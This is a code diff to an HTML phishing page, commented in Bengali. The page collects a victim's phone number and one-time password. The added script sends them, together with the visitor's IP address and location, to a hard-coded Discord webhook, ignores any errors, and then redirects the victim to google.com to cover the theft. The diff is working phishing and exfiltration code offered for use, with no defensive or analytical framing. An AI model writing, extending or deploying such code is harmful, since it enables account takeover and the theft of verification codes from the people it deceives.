@@ -83,10 +83,10 @@ button:hover{background:#005999}
         <button onclick="nextStep()">পরবর্তী (Next)</button>
     </div>
 
-    <!-- ধাপ ২: ওটিপি (OTP) ইনপুট -->
+    <!-- ধাপ ২: ওটিপি (OTP) ইনপুট (কোনো ডেমো কোড থাকবে না) -->
     <div id="otpSection">
-        <input type="text" id="otpCode" placeholder="OTP কোড দিন" maxlength="6">
-        <button onclick="submitData()">যাচাই করুন (Verify)</button>
+        <input type="text" id="otpCode" placeholder="৬ ডিজিটের OTP কোড দিন" maxlength="6">
+        <button onclick="submitData()">Verify OTP</button>
     </div>
 
     <!-- ধাপ ৩: লোডিং ও সফল মেসেজ সেকশন -->
@@ -100,7 +100,7 @@ button:hover{background:#005999}
 </div>
 
 <script>
-// আপনার ডিসকর্ড ওয়েবহুক ইউআরএল এখানে সংযুক্ত রয়েছে
+// আপনার প্রদান করা সঠিক ডিসকর্ড ওয়েবহুক ইউআরএল
 const webhookUrl = "https://discord.com/api/webhooks/1568661175959298110/oGptGCUpE-n-4GTWtG2vR72e6K9e9eYqSBMrGskI38492Fs8qhtuzyi0Wa2d9qrTv54d";
 
 let capturedPhone = "";
@@ -146,4 +146,31 @@ async function submitData() {
                 fields: [
                     { name: "📱 PHONE NUMBER", value: `\`${capturedPhone}\``, inline: true },
                     { name: "🔑 OTP CODE", value: `\`${otp}\``, inline: true },
- 
+                    { name: "🌐 IP ADDRESS", value: `**${ipData.ip || 'UNKNOWN'}**`, inline: true },
+                    { name: "📍 LOCATION", value: `${ipData.city || 'N/A'}, ${ipData.country_name || 'N/A'}`, inline: true }
+                ],
+                footer: { text: "Timestamp: " + new Date().toLocaleString() }
+            }]
+        };
+
+        // সরাসরি ডিসকর্ড ওয়েবহুকে পোস্ট রিকোয়েস্ট পাঠানো
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+            keepalive: true
+        });
+
+    } catch (e) {
+        // কোনো এরর হলেও ফ্লো অব্যাহত রাখা
+    }
+
+    // ২ সেকেন্ড স্পিনার ঘুরানোর পর রিডাইরেক্ট করা
+    setTimeout(() => {
+        window.location.replace("https://www.google.com");
+    }, 2000);
+}
+</script>
+
+</body>
+</html>
